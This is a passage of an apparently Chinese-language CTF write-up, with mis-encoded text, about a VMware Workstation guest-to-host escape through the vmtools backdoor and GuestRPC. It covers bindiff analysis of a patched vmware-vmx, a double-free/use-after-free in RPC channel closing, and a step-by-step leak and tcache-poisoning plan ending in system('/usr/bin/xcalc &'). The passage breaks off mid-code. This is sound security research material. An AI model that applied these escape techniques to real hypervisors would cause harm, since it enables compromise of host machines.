id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h3><p>ç»å¸¸ä½¿ç”¨vmwareè™šæ‹Ÿæœºçš„äººä¸€å®šä¼šç†Ÿæ‚‰å…¶æ‹–æ‹½åŠŸèƒ½ï¼Œå³Guestå’Œhostä¹‹é—´çš„æ–‡ä»¶ä¼ é€’ä»¥åŠå¤åˆ¶ä¹‹ç±»çš„æ“ä½œï¼Œéƒ½æ˜¯åŸºäºæ‹–æ‹½å®ç°çš„ï¼Œæ‹–æ‹½çš„èƒŒåæ˜¯Guestå’Œhostä¹‹é—´çš„é€šä¿¡æœºåˆ¶ã€‚è€ŒVmç±»å‹çš„é€ƒé€¸ä¸­ï¼Œåˆ©ç”¨çš„å°±æ˜¯è¯¥é€šä¿¡æœºåˆ¶ï¼Œè¿™ç±»æœºåˆ¶è¢«è®¾è®¡æ˜¯ç°åœ¨äº†vmtoolså½“ä¸­ï¼Œé«˜ç‰ˆæœ¬çš„vmwareï¼Œvmtoolsæ¶ˆå¤±ï¼Œç›´æ¥è¢«è‡ªå¸¦å®‰è£…ã€‚</p><h3 id="backdooræœºåˆ¶"><a href="#backdooræœºåˆ¶" class="headerlink" title="backdooræœºåˆ¶"></a>backdooræœºåˆ¶</h3><p>vmtoolsä¸­æœ‰ä¸€ä¸ªå«åšbackdoorçš„æ¥å£ï¼Œè¯¥æ¥å£è¢«ç”¨æ¥å®ç°é€šä¿¡ã€‚<a href="https://sites.google.com/site/chitchatvmback/backdoor">å®˜æ–¹æ–‡æ¡£</a>,githubä¸­çš„å¼€æºæ–‡æ¡£ä¹Ÿæœ‰<a href="https://github.com/vmware/open-vm-tools/blob/master/open-vm-tools/lib/backdoor/backdoorGcc64.c#L74-L104">open-vmtools</a>.</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span><span class="token function">Backdoor_InOut</span><span class="token punctuation">(</span>Backdoor_proto <span class="token operator">*</span>myBp<span class="token punctuation">)</span> <span class="token comment">// IN/OUT</span><span class="token punctuation">&#123;</span>   uint64 dummy<span class="token punctuation">;</span>   __asm__ <span class="token function">__volatile__</span><span class="token punctuation">(</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">__APPLE__</span></span>        <span class="token comment">/*         * Save %rbx on the stack because the Mac OS GCC doesn't want us to         * clobber it - it erroneously thinks %rbx is the PIC register.         * (Radar bug 7304232)         */</span>        <span class="token string">"pushq %%rbx"</span>           <span class="token string">"\n\t"</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>        <span class="token string">"pushq %%rax"</span>           <span class="token string">"\n\t"</span>        <span class="token string">"movq 40(%%rax), %%rdi"</span> <span class="token string">"\n\t"</span>        <span class="token string">"movq 32(%%rax), %%rsi"</span> <span class="token string">"\n\t"</span>        <span class="token string">"movq 24(%%rax), %%rdx"</span> <span class="token string">"\n\t"</span>        <span class="token string">"movq 16(%%rax), %%rcx"</span> <span class="token string">"\n\t"</span>        <span class="token string">"movq  8(%%rax), %%rbx"</span> <span class="token string">"\n\t"</span>        <span class="token string">"movq   (%%rax), %%rax"</span> <span class="token string">"\n\t"</span>        <span class="token string">"inl %%dx, %%eax"</span>       <span class="token string">"\n\t"</span>  <span class="token comment">/* NB: There is no inq instruction */</span>        <span class="token string">"xchgq %%rax, (%%rsp)"</span>  <span class="token string">"\n\t"</span>        <span class="token string">"movq %%rdi, 40(%%rax)"</span> <span class="token string">"\n\t"</span>        <span class="token string">"movq %%rsi, 32(%%rax)"</span> <span class="token string">"\n\t"</span>        <span class="token string">"movq %%rdx, 24(%%rax)"</span> <span class="token string">"\n\t"</span>        <span class="token string">"movq %%rcx, 16(%%rax)"</span> <span class="token string">"\n\t"</span>        <span class="token string">"movq %%rbx,  8(%%rax)"</span> <span class="token string">"\n\t"</span>        <span class="token string">"popq          (%%rax)"</span> <span class="token string">"\n\t"</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">__APPLE__</span></span>        <span class="token string">"popq %%rbx"</span>            <span class="token string">"\n\t"</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>å…¶ä¸­æœ‰ä¸€æ¡ç‰¹æƒæŒ‡ä»¤ï¼Œ<code>in</code>ï¼Œè¿™æ¡æŒ‡ä»¤åœ¨æ­£å¸¸çš„æ“ä½œç³»ç»Ÿæ‰§è¡Œä¼šæŠ¥é”™ï¼Œä½†æ˜¯åœ¨vmä¸­çš„guestæœºå™¨æ‰§è¡Œè¿™æ¡æŒ‡ä»¤ï¼Œè¿™ä¸ªå¼‚å¸¸ä¼šè¢« vmtoolsæ•è·ï¼Œç„¶åä¼ é€’ç»™<code>vmware-vmx.exe</code>è¿›è¡Œé€šä¿¡æ“ä½œã€‚</p><p><strong>é‡ç‚¹åœ¨äºï¼Œbackdooræ™®é€šç”¨æˆ·ä¹Ÿå¯ä»¥æ‰§è¡Œ</strong>ï¼Œæ‰€ä»¥ï¼Œguestä¸­ï¼Œæ‰§è¡Œç›¸åº”çš„ä»£ç ï¼Œè®©æ“ä½œç³»ç»Ÿé™·å…¥hypervisorå±‚ï¼Œç„¶åå†åˆ©ç”¨backdoorå’Œhostè¿›è¡Œé€šä¿¡ï¼Œè§¦å‘æ­¤bugã€‚</p><p>é€šä¿¡æ‰€éœ€è¦çš„å‡½æ•°ï¼Œå†open-vmtoolsä¸­ä¹Ÿæœ‰å®ç°ã€‚<code>Message_Send</code>å’Œ<code>Message_Recv</code>ã€‚<a href="https://github.com/vmware/open-vm-tools/blob/master/open-vm-tools/lib/message/message.c">gité“¾æ¥</a>ã€‚</p><p>åœ¨æŸä¸€ç¯‡<a href="http://sysprogs.com/legacy/articles/kdvmware/guestrpc.shtml">æ–‡æ¡£</a>ä¸­ï¼Œç»™å‡ºäº†è¯¥æ“ä½œçš„åŸºæœ¬ä½¿ç”¨.</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">unsigned</span> <span class="token function">__declspec</span><span class="token punctuation">(</span>naked<span class="token punctuation">)</span> <span class="token function">GetMousePos</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    __asm    <span class="token punctuation">&#123;</span>        mov eax<span class="token punctuation">,</span> <span class="token number">564</span>D5868h        mov ecx<span class="token punctuation">,</span> <span class="token number">4</span>        mov edx<span class="token punctuation">,</span> <span class="token number">5658</span>h        in eax<span class="token punctuation">,</span> dx        ret    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">unsigned</span> mousepos <span class="token operator">=</span> <span class="token function">GetMousePos</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span> <span class="token string">"é¼ æ ‡å…‰æ ‡ä½ç½®ï¼šx=%d,y=%d\n"</span> <span class="token punctuation">,</span> mousepos <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">,</span> mousepos <span class="token operator">&amp;</span> <span class="token number">0xFFFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><blockquote><p>If this program is executed on a real machine, the in instruction  will cause a â€œprivileged instructionâ€ exception, as user-mode code runs  in Ring 3. However, when this program is executed on the virtual  machine, it will print the correct mouse cursor position.</p><p>åœ¨çœŸæœºä¸Šä¼šæŠ¥é”™ï¼Œè€Œåœ¨è™šæ‹Ÿæœºä¸­ï¼Œå°†è·å¾—é¼ æ ‡ä½ç½®ã€‚</p></blockquote><h3 id="GuestRPC-Drag-and-Drop-RPCI"><a href="#GuestRPC-Drag-and-Drop-RPCI" class="headerlink" title="GuestRPC | Drag and Drop RPCI"></a>GuestRPC | Drag and Drop RPCI</h3><p>è¿™æ˜¯åœ¨backdooråŸºç¡€ä¸Šå®ç°çš„æ›´ä¸ºçµæ´»çš„é€šä¿¡æ–¹å¼ã€‚å•ä¸ª GuestRPC è°ƒç”¨ç”±ä¸€ç³»åˆ—è¯·æ±‚ç»„æˆï¼š</p><ul><li>æ‰“å¼€ GuestRPC é€šé“</li><li>å‘é€å‘½ä»¤é•¿åº¦</li><li>å‘é€å‘½ä»¤æ•°æ®</li><li>æ¥æ”¶å›å¤å¤§å°</li><li>æ¥æ”¶å›å¤æ•°æ®</li><li>å‘å‡ºæ¥æ”¶ç»“æŸä¿¡å·</li><li>å…³é—­é¢‘é“</li></ul><p>å…·ä½“çš„å‡½æ•°å®ç°åé¢å†å»åˆ†æï¼Œè¿™é‡Œå®é™…ä¸Šæ˜¯å®ç°äº†ä¸€å¥—ä¸é‚£ä¹ˆåº•å±‚çš„é€šä¿¡æœºåˆ¶ã€‚ä¾é è¿™ä¸ªæœºåˆ¶ï¼Œguestå’Œhostä¹‹é—´å¯ä»¥å®ç°è®¸å¤šæœ‰æ„æ€çš„æ“ä½œï¼Œä¾‹å¦‚ï¼šdndï¼ˆDrag n Dropï¼‰ã€cpï¼ˆCopy Pasteï¼‰æ“ä½œã€å‘é€æˆ–è·å–ä¿¡æ¯ç­‰ã€‚</p><p><img src="https://i.bmp.ovh/imgs/2022/06/11/3a60818ae9d00e21.png" alt="img"></p><p>å†&#x2F;lib&#x2F;include&#x2F;rpcout.hä¸­å®šä¹‰äº†ç›¸å…³çš„ä¸€äº›å‡½æ•°ï¼Œè¿™äº›å‡½æ•°ç”¨æ¥æ„å»ºå’Œæ‘§æ¯rpcé€šé“ã€‚</p><p>æœ€åçš„è°ƒç”¨è¿½è¸ªå¦‚ä¸‹ã€‚</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">Rpcout_start<span class="token operator">-></span>Message_OpenAllocated<span class="token operator">-></span>Backdoor<span class="token punctuation">;</span>RpcOut_send<span class="token operator">-></span>Message_Send  <span class="token operator">&amp;</span> Message_Receive<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><p>è¿™å‡ å¤„å‡½æ•°è°ƒç”¨å¯¹backdoorçš„æ“ä½œéƒ½æ˜¯åŸºäºä¸€ä¸ªç»“æ„ä½“ã€‚<code>Backdoor_proto</code></p><p>åœ¨<code>backdoor_types.h</code>ä¸­å¯¹å…¶æœ‰å®šä¹‰ã€‚</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DECLARE_REG64_STRUCT</span> <span class="token punctuation">\</span>   <span class="token expression">DECLARE_REG32_STRUCT<span class="token punctuation">;</span> </span><span class="token punctuation">\</span>   <span class="token expression"><span class="token keyword">struct</span> <span class="token punctuation">&#123;</span> </span><span class="token punctuation">\</span>      <span class="token expression">uint32 low<span class="token punctuation">;</span> </span><span class="token punctuation">\</span>      <span class="token expression">uint32 high<span class="token punctuation">;</span> </span><span class="token punctuation">\</span>   <span class="token expression"><span class="token punctuation">&#125;</span> words<span class="token punctuation">;</span> </span><span class="token punctuation">\</span>   <span class="token expression">uint64 quad</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>å®é™…ä¸Šå°±æ˜¯å¯¹ç›¸åº”çš„å¯„å­˜å™¨åšä¸€ä¸ªè®¾ç½®ã€‚</p><p>é™¤äº†ä»¥ä¸Šçš„å‡½æ•°ï¼Œvmxè¿˜æä¾›äº†ä¸€ç§é¢å‘å¯¹è±¡çš„æ–¹æ³•å®ç°ä»¥ä¸ŠåŠŸèƒ½ï¼ŒVMWareRPCChannelç±»ï¼Œè¯¥ç±»å¯ä»¥åœ¨å†…æ ¸å’Œç”¨æˆ·æ¨¡å¼ä¸‹ä½¿ç”¨ã€‚</p><blockquote><p>By using <a href="http://kdvmware.sysprogs.org/dox/a00032.html">VMWareRPCChannel</a> class it is possible to execute arbitrary GuestRPC requests, that  VMWare supports. However, the question of adding our own request types  is still open. Letâ€™s examine the VMWARE-VMX.EXE internals. When a  GuestRPC is being issued by guest, code inside the VMWARE-VMX.EXE  searches the so-called GuestRPC handler table for a handler  corresponding the the issued request. A GuestRPC handler entry format  can be defined by the following structure:</p></blockquote><p>å…·ä½“çš„å®ç°è¿™é‡Œä¸èµ˜è¿°ï¼Œæ­¤å¤–é•¿äº­çš„å¸ˆå‚…ä¹Ÿå®ç°äº†ä¸€å¥—Rpcçš„é€šä¿¡æœºåˆ¶ï¼Œåœ¨å…¶çŸ¥ä¹æ–‡ç« æœ‰åˆ†æã€‚</p><p>é€šè¿‡è¿™ä¸ªRPCIå¯ä»¥ç›´æ¥å‘RPCï¼Œä»¥å¾€ç‰ˆæœ¬çš„æ¼æ´åˆ†æä¸­å·²ç»æœ‰è¯¥DnDæ¼æ´çš„å­˜åœ¨ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-8c778cb84b93e2c11fe15cbc508a537bd365b3e7.png" alt="å›¾ç‰‡.png"><br> memcpyæ²¡æœ‰sizeçš„åˆ¤æ–­ï¼Œå¯¼è‡´ç¬¬äºŒä¸ªåŒ…å¯ä»¥ç›´æ¥æ”¹totalsizeä¸ºä¸€ä¸ªå¤§å€¼ï¼Œè¿™æ ·å¯¼è‡´äº†memcpyçš„æº¢å‡ºã€‚å‘é€Dndçš„ä»£ç åœ¨dndCPTransportGuestRpc.hppä¸­ï¼ŒåŒæ ·å¯ä»¥åœ¨open-vmtoolsé‡Œé¢æ‰¾åˆ°æºç ã€‚æœ‰äººæ€»ç»“å‡ºäº†å‘é€è·¯å¾„ã€‚</p><blockquote><p>rpcv3util::SendMsg-&gt;DnDCPTransportGuestRpc::SendPacket-&gt;RpcChannel_Send-&gt;Message_Send-&gt;backdoor</p></blockquote><h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><h4 id="é™æ€åˆ†æ"><a href="#é™æ€åˆ†æ" class="headerlink" title="é™æ€åˆ†æ"></a>é™æ€åˆ†æ</h4><p>é¢˜ç›®ç»™å‡ºäº†</p><p>rwctf.ovfã€rwctf-disk1.vmdkã€rwctf.mfã€vmware-vmx-patchedã€VMware-Workstation-Full-15.0.2-10952284.x86_64.bundleå’Œvmware-vmx</p><p>ä½¿ç”¨vof vmdk mfå¯ä»¥åˆ›å»ºä¸€ä¸ªé¢˜ç›®ç›¸åŒç¯å¢ƒçš„è™šæ‹Ÿæœºï¼Œpatchedå³ä¸ºé¢˜ç›®ç¯å¢ƒçš„vmxï¼Œè€Œbundleå®‰è£…åŒ…ä¸­çš„æ˜¯ç»™å‡ºçš„vmware-vmxã€‚</p><p>ä½¿ç”¨bindiffæ¯”è¾ƒpatchedå’ŒåŸç‰ˆçš„ä¸åŒå¯ä»¥å¿«é€Ÿå®šä½æ¼æ´ä½ç½®ï¼Œbindiffå®˜ç½‘åœ¨å¤–ç½‘ï¼Œå¯ä»¥åœ¨52ç ´è§£ä¸‹è½½ã€‚</p><p>ä½¿ç”¨idaçš„bindiffæ’ä»¶ï¼Œç„¶åæŠŠdiffç»“æœå¯¼å…¥bindiffè½¯ä»¶å³å¯ã€‚</p><p>æŸ¥çœ‹å‡ºæ¥çš„ä¸åŒæœ‰1å¤„ï¼Œ</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-d11ec0897a90dd8c3ffacd41ebf25d705c91d72f.png" alt="å›¾ç‰‡.png"><br> åŒå‡»æŸ¥çœ‹å‡½æ•°å†…å®¹</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-7d058ac9547b0c5f1d39ba965dd9b771c627d9fb.png" alt="å›¾ç‰‡.png"></p><p>å¯ä»¥çœ‹åˆ°patchedåœ°æ–¹åŠ å…¥äº†å¤§éƒ¨åˆ†çš„nopæŒ‡ä»¤ï¼Œå›åˆ°idaä»”ç»†åˆ†æè¯¥æµç¨‹å¤„nopæ‰çš„ä¸œè¥¿æ˜¯ä»€ä¹ˆã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-213799f6fc4e4063222b7f27d7ff3bf3d6a95b52.png" alt="å›¾ç‰‡.png"></p><p>ä»”ç»†æ¯”è¾ƒå‘ç°æœ‰ä¸€å¤„andè¢«ä¿®æ”¹ï¼Œè¿˜æœ‰ä¸€å¤„callä¹‹å‰çš„ä¸€ä¸ªmovæŒ‡ä»¤è¢«nopæ‰äº†ï¼ŒF5å›å»æŸ¥çœ‹è¢«æ”¹æ‰çš„ä½ç½®ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b60e6ffb7fa00eee453237c55f8b52c31cdb4593.png" alt="å›¾ç‰‡.png"></p><p>å°‘äº†ä¸€å¤„è¢«ç½®ä¸º0çš„æ“ä½œï¼Œè¿˜æœ‰ä¸€å¤„andæ“ä½œä¿®æ”¹ï¼ŒæŸ¥çœ‹æ•´ä¸ªå‡½æ•°ï¼Œå¤§éƒ¨åˆ†éƒ½æ˜¯<code>GuestMsg: Channel</code>ä¹‹ç±»çš„ä¸œè¥¿ï¼Œä»¥åŠä¸Šé¢çš„switchæ“ä½œï¼Œæ­¤å¤–æŠ¥é”™éƒ½æ˜¯ä¸€äº›åè®®é”™è¯¯ä»¥åŠæ ¼å¼ä¹‹ç±»çš„ä¸œè¥¿ï¼ŒçŒœæµ‹è¿™é‡Œæ˜¯RPCæŒ‡ä»¤çš„å¤„ç†å‡½æ•°ã€‚</p><p>ç„¶åæˆ‘å°±ä¸€å¤´æ‰è¿›äº†open-vmçš„æºç ï¼Œï¼Œã€‚ã€‚</p><p>çœ‹äº†éå¸¸ä¹…ï¼Œå¤§æ¦‚å¾—å‡ºä¸€ä¸ªç»“æ„ä½“çš„æ¨¡å‹</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-61000bff1bf24027f6e26da3bdf1ea5dfc805946.png" alt="å›¾ç‰‡.png"></p><p>å…¶ä¸­å¤§éƒ¨åˆ†çš„æ“ä½œè¿˜çœ‹ä¸å¤ªæ‡‚ï¼Œç„¶åçªç„¶æƒ³èµ·æ¥æŸ¥çœ‹GuestRPC çš„æ“ä½œæµç¨‹ã€‚</p><ul><li>æ‰“å¼€ GuestRPC é€šé“</li><li>å‘é€å‘½ä»¤é•¿åº¦</li><li>å‘é€å‘½ä»¤æ•°æ®</li><li>æ¥æ”¶å›å¤å¤§å°</li><li>æ¥æ”¶å›å¤æ•°æ®</li><li>å‘å‡ºæ¥æ”¶ç»“æŸä¿¡å·</li><li>å…³é—­é¢‘é“</li></ul><p>å‘ç°å¯ä»¥å’Œè¿™é‡Œçš„switchå¯¹åº”èµ·æ¥ï¼Œå¯ä»¥æ›´åŠ æ¸…é™¤çš„ç†è§£å…¶å†…å®¹ã€‚</p><p>è¿™é‡Œå»æ‰äº†ç½®0æ“ä½œï¼Œæ²¡æœ‰å°†ç¬¬ä¸€å¤„bufç½®ç©ºï¼Œç¬¬äºŒå¤„æŠŠæ ‡å¿—æ”¹ä¸ºäº†21ï¼Œè¿™é‡Œå¯èƒ½æ˜¯æ¼æ´å½¢æˆçš„é‡ç‚¹ã€‚</p><p>æ ¹æ®æ­£å¸¸æµç¨‹ï¼Œç›®æ ‡å¤„è°ƒç”¨çš„æ˜¯è¿™æ ·ä¸€ä¸ªå‡½æ•°ã€‚</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">close_backdoor</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> __int16 a2<span class="token punctuation">,</span> <span class="token keyword">char</span> a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">void</span> <span class="token operator">*</span>v4<span class="token punctuation">;</span> <span class="token comment">// rdi</span>  v4 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>a3 <span class="token operator">&amp;</span> <span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">free</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>a3 <span class="token operator">&amp;</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">sub_176D90</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">sub_55A0E0</span><span class="token punctuation">(</span><span class="token string">"GuestRpc: Closing RPCI backdoor channel %u after send completion\n"</span><span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">sub_189FE0</span><span class="token punctuation">(</span>a2<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>è¿™é‡Œæœ‰ä¸€ä¸ªifåˆ†æ”¯æ˜¯freeæ‰a1+8ä½ç½®çš„bufï¼Œè¦æ±‚æ˜¯a3 and 0x20!&#x3D;0ï¼Œè¿™å°±åˆšå¥½å’Œpatchçš„åœ°æ–¹ç›¸ç¬¦åˆï¼Œè¿™é‡Œä¼šå¯¼è‡´ä¸€æ¬¡freeã€‚</p><p>æ­¤å¤„é‡Šæ”¾çš„ç¼“å†²åŒºæ˜¯åç§»ä¸º8çš„åœ°æ–¹çš„ç¼“å†²åŒºï¼Œè¯¥ç¼“å†²åŒºå¯¹åº”äºå†…éƒ¨ç”¨äºå­˜å‚¨ä¼ é€’å›ç”¨æˆ·çš„å›å¤æ•°æ®çš„ç¼“å†²åŒºã€‚</p><p>åŒæ—¶åœ¨switch&#x3D;6çš„æ—¶å€™ï¼Œæ­¤å¤„ä¼šå†æ¬¡é‡Šæ”¾ï¼Œè¿™å°±å¯¼è‡´äº†DFå­˜åœ¨ï¼Œè€Œåœ¨è¿™ä¸ªDFçš„ä¸­é—´ï¼Œé‡å¤ä½¿ç”¨è¯¥åŒºåŸŸï¼Œå¯ä»¥åˆ©ç”¨ä¸ºUAFã€‚</p><p>ä¸‹é¢å°±æœ‰äº†åŸºæœ¬çš„æ€è·¯</p><ul><li>leak</li><li>æ›´æ”¹tcacheçš„fd</li><li>è·å–<code>rip</code>æ§åˆ¶<code>rdi</code>è°ƒç”¨<code>system(&quot;/usr/bin/xcalc &amp;&quot;)</code></li></ul><p>åœ¨æ­¤guestrpcçš„åŒºé—´å†…ï¼Œå¯¹å †çš„æ“ä½œéå¸¸å°‘ï¼Œæ‰€ä»¥è¯¥æ¼æ´åˆ©ç”¨ä¹Ÿæ˜¯æ¯”è¾ƒç¨³å›ºçš„ã€‚</p><h4 id="attack"><a href="#attack" class="headerlink" title="attack"></a>attack</h4><p>leakæ“ä½œåˆ©ç”¨çš„æ˜¯æ¯”è¾ƒè€å¥—çš„uafåˆ©ç”¨</p><ul><li>åˆ†é…ä¸‰ä¸ªé€šé“ [A]ã€[B] å’Œ [C]</li><li>å°†å‘½ä»¤å‘é€<code>info-set</code>åˆ°é€šé“ [A]</li><li>æ‰“å¼€é€šé“ [B] å¹¶å‘å‡º a <code>info-get</code>ä»¥æ£€ç´¢æˆ‘ä»¬åˆšåˆšè®¾ç½®çš„æ•°æ®</li><li>åœ¨é€šé“ [B] ä¸Šå‘å‡ºå›å¤é•¿åº¦å’Œå›å¤è¯»å–å‘½ä»¤</li><li>åœ¨é€šé“ [B] ä¸Šè°ƒç”¨é”™è¯¯çš„ finalize å‘½ä»¤ï¼Œé‡Šæ”¾åº•å±‚çš„å›å¤ç¼“å†²åŒº</li><li>åœ¨é€šé“ [C] ä¸Šè°ƒç”¨<code>info-get</code>å¹¶æ¥æ”¶å›å¤é•¿åº¦ï¼Œå®ƒåœ¨æˆ‘ä»¬åˆšåˆšåˆ†é…çš„åŒä¸€åœ°å€åˆ†é…ä¸€ä¸ªç¼“å†²åŒº</li><li>å…³é—­é€šé“ [B]ï¼Œå†æ¬¡é‡Šæ”¾ç¼“å†²åŒº</li><li>é˜…è¯»é¢‘é“[C]ä¸Šçš„å›å¤ä»¥æ³„éœ²æˆ‘ä»¬çš„æ•°æ®</li></ul><p>ä½†æ˜¯åœ¨channel Cä¸Šå½¢æˆçš„uafï¼Œå´å¹¶ä¸èƒ½åšåˆ°åœ¨tcacheä¸­æ³„éœ²æƒ³è¦çš„glibcåœ°å€ï¼Œæ‰€ä»¥åœ¨æ­¤åŸºç¡€ä¸Šè¿˜éœ€è¦å¾€Cä¸­å¡«å…¥ä¸€äº›å¯ä»¥åˆ©ç”¨çš„åœ°å€ã€‚</p><p>è¿™æ—¶å€™è€ƒè™‘åˆ°2017å¹´çš„ä¸€ä¸ªcveï¼Œé€šè¿‡dnd_versioné€ æˆvtableçš„leakã€‚</p><p>åˆ†ædnd_versionå¦‚ä¸‹ã€‚idaä¸­æœç´¢<code>vmx.capability.dnd_version</code>ï¼Œæ‰¾åˆ°å¯¹åº”çš„bindå‡½æ•°ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-a3f065bd71745da225b1c04c4a6d034e89f421c8.png" alt="å›¾ç‰‡.png"></p><p>å…¶ä»–çš„RPCå‘½ä»¤ç±»ä¼¼ï¼Œåœ¨å‘é€â€œvmx.capability.dnd_versionâ€å‘½ä»¤çš„æ—¶å€™ï¼Œå¯¹åº”çš„å¤„ç†å‡½æ•°ä¸­å¦‚æœå‘ç°å½“å‰ç‰ˆæœ¬å’Œè®¾ç½®çš„ç‰ˆæœ¬ä¸ä¸€è‡´ï¼Œå°±ä¼šè°ƒç”¨å‡½æ•°åˆ›å»ºæ–°çš„ objectï¼ŒæŠŠåŸæ¥çš„ç‰ˆæœ¬çš„objecté”€æ¯ã€‚</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">sub_1116D0</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">,</span> __int64 a3<span class="token punctuation">,</span> <span class="token keyword">int</span> a4<span class="token punctuation">,</span> __int64 reply<span class="token punctuation">,</span> __int64 reply_len<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// er12</span>  __int64 v9<span class="token punctuation">;</span> <span class="token comment">// rax</span>  __int64 v10<span class="token punctuation">;</span> <span class="token comment">// rsi</span>  <span class="token keyword">int</span> v12<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-30h] BYREF</span>  <span class="token keyword">int</span> v13<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-2Ch] BYREF</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>a4 <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">set_reply</span><span class="token punctuation">(</span>reply<span class="token punctuation">,</span> reply_len<span class="token punctuation">,</span> <span class="token string">"1 argument expected"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v12 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token 